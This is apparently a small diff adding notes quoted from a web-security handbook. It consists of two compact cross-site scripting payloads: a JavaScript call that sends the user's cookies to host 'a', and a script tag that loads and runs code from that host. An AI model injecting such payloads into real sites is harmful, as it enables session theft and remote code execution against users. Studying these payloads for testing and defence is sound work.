@@ -1,0 +1,7 @@
+If you are injecting into an existing script, the following 28-byte command transmits the user's cookies to the server with
+hostname a: open("//a/"+document.cookie)
+
+Alternatively, if you are injecting straight into HTML, the following 30-byte tag loads and executes a script from the
+server with hostname a: <script src=http://a></script>
+
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12639-12646). Wiley. Kindle Edition. 
